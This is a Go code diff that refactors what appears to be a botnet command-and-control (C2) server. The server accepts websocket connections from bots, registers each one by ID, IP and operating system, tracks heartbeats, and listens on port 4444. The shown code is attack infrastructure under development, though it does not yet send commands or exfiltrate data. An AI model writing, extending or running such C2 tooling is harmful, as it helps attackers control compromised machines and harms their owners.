@@ -29,40 +29,53 @@ type Bot struct {
 // }
 
 type c2 struct {
-	bots map[string]Bot
+	bots map[string]*Bot
 }
 
 func Newc2() *c2 {
 	return &c2{
-		bots: make(map[string]Bot),
+		bots: make(map[string]*Bot),
 	}
 }
 
-func connectBot(w http.ResponseWriter, r *http.Request) {
+func (c *c2) connectBot(w http.ResponseWriter, r *http.Request) {
 	b := Bot{
 		Active: false,
 	}
+
 	var con *websocket.Conn
 	var err error
 	if con, err = websocket.Accept(w, r, nil); err != nil {
 		log.Println(err)
 		return
 	}
-
+	go heartBeat(con, &b)
 	defer con.Close(websocket.StatusNormalClosure, "")
 	ctx := context.Background()
-
-	go heartBeat(con, &b)
+	if err := wsjson.Read(ctx, con, &b); err != nil {
+		log.Println(err)
+		return
+	}
+	b.mu.Lock()
+	b.LastSeen = time.Now()
+	b.Active = true
+	c.bots[b.ID] = &b
+	b.mu.Unlock()
+	fmt.Print(b.ID, b.IP, b.OS, b.LastSeen)
 	for {
-		if err := wsjson.Read(ctx, con, &b); err != nil {
+		var botmsg string
+		if err := wsjson.Read(ctx, con, &botmsg); err != nil {
 			log.Println(err)
 			return
 		}
-		b.mu.Lock()
-		b.LastSeen = time.Now()
-		b.Active = true
-		b.mu.Unlock()
-		fmt.Print(b.ID, b.IP, b.OS, b.LastSeen)
+
+		switch botmsg {
+		case "heartbeat":
+			b.mu.Lock()
+			b.LastSeen = time.Now()
+			b.mu.Unlock()
+		}
+
 	}
 
 }
@@ -96,8 +109,8 @@ func heartBeat(con *websocket.Conn, bot *Bot) {
 
 }
 func main() {
-
-	http.HandleFunc("/connect", connectBot)
+	c2 := Newc2()
+	http.HandleFunc("/connect", c2.connectBot)
 	http.ListenAndServe(":4444", nil)
 
 }
